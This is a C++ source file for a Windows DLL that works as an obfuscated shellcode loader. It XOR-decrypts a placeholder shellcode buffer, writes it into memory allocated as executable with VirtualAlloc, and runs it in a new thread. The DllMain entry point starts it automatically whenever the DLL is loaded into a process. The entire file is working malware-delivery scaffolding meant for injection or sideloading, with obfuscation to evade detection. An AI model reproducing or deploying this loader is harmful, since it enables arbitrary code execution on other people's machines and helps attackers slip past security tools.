// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <processthreadsapi.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void run_shell(void) 
{
    unsigned char buf[] = "CRYPTED_SHELLCODE_HERE";
    char xor_key = '7';
    int buf_len = (int)sizeof(buf);
    LPVOID addr;
    unsigned char decrypted;
    LPVOID hThread;
    // Allocate readable, writable, and executable memory
    addr = VirtualAlloc(NULL, buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // Decrypt shellcode bytes by XORing each one with 0x37
    for (int i = 0; i < buf_len; i++) {
        buf[i] = buf[i] ^ xor_key;
    }
    // Copy shellcode into the allocated buffer
    memcpy(addr, buf, buf_len);
    // Execute the shellcode
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, 0);
    WaitForSingleObject(hThread, -1);
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Call the shellcode runner function when DLL gets attached to a process (LoadLibraryA)
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_shell, NULL, 0, 0);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

